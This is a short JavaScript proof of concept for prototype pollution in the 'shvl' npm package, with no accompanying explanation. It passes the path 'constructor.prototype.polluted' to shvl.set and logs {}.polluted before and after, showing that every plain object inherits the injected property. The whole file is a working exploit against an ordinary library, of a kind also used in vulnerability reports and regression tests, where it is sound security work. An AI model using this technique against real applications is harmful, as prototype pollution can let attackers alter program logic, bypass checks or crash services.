var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var shvl = require('shvl');
obj = {};
console.log({}.polluted);
shvl.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);